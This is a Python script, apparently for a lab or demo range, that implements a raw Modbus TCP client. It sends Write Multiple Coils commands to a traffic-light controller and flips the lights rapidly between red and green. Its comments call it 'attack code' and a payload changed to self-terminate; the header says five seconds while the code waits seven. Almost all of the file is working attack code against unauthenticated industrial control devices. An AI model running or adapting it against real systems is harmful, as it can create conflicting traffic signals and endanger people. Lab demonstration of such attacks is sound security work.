# This is a modified version of the traffic light scenario / demo scenario payload.
# It was modified to self-terminate after five seconds. 

import socket
import struct
import sys
from time import sleep, time

class ModbusTCP:
    def __init__(self, host, port=502):
        self.host = host
        self.port = port
        self.sock = None
        self.transaction_id = 0
        
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        
    def close(self):
        if self.sock:
            self.sock.close()
            
    def _send_request(self, slave, function_code, data):
        # Increment transaction ID
        self.transaction_id = (self.transaction_id + 1) % 65536
        
        # Build MBAP header
        protocol_id = 0
        length = len(data) + 2  # data + unit_id + function_code
        mbap = struct.pack('>HHHB', self.transaction_id, protocol_id, length, slave)
        
        # Build PDU
        pdu = struct.pack('B', function_code) + data
        
        # Send complete message
        self.sock.sendall(mbap + pdu)
        
        # Receive response
        response = self.sock.recv(1024)
        return response
        
    def write_coils(self, start_addr, values, slave=1):
        num_coils = len(values)
        num_bytes = (num_coils + 7) // 8
        
        # Pack coil values into bytes
        coil_bytes = []
        for i in range(num_bytes):
            byte = 0
            for bit in range(8):
                index = i * 8 + bit
                if index < num_coils and values[index]:
                    byte |= (1 << bit)
            coil_bytes.append(byte)
        
        # Build request data
        data = struct.pack('>HHB', start_addr, num_coils, num_bytes)
        data += bytes(coil_bytes)
        
        # Function code 0x0F: Write Multiple Coils
        response = self._send_request(slave, 0x0F, data)
        return response
        
    def read_coils(self, start_addr, num_coils, slave=1):
        # Build request data
        data = struct.pack('>HH', start_addr, num_coils)
        
        # Function code 0x01: Read Coils
        response = self._send_request(slave, 0x01, data)
        
        # Parse response
        # Skip MBAP header (7 bytes) + function code (1 byte) + byte count (1 byte)
        byte_count = response[8]
        coil_data = response[9:9+byte_count]
        
        # Unpack bits
        bits = []
        for i in range(num_coils):
            byte_index = i // 8
            bit_index = i % 8
            if byte_index < len(coil_data):
                bit_value = (coil_data[byte_index] >> bit_index) & 1
                bits.append(bit_value)
            else:
                bits.append(0)
                
        return bits

# Main script
# The traffic pi's primary ip is 192.168.8.12, but we can't hit that one.
# It has another IP in the Ludus network, which is 192.0.2.102, so 
# that's what we'll use.
client = ModbusTCP('192.0.2.102', port=502)
client.connect()

print("Running the rapid traffic light test script.")
print("You should see the traffic light rapidly change colors for a few seconds.")
init_time = time()

try:
    while True:
        for i in range(2): # values are 0 or 1
            # This attack code oscillates between red & green
            if i: 
                coils = [1, 0, 0, 1, 0, 0]
            else: 
                coils = [0, 0, 1, 0, 0, 1]
            client.write_coils(0, coils, slave=1)
            
            start_read = 0
            result = client.read_coils(start_read, 8, slave=1)
            
            if time() >= init_time + 7:
                print("Testing done. Exiting now")
                client.close()
                sys.exit(0)

            sleep(0.02)
except:
    pass

client.close()
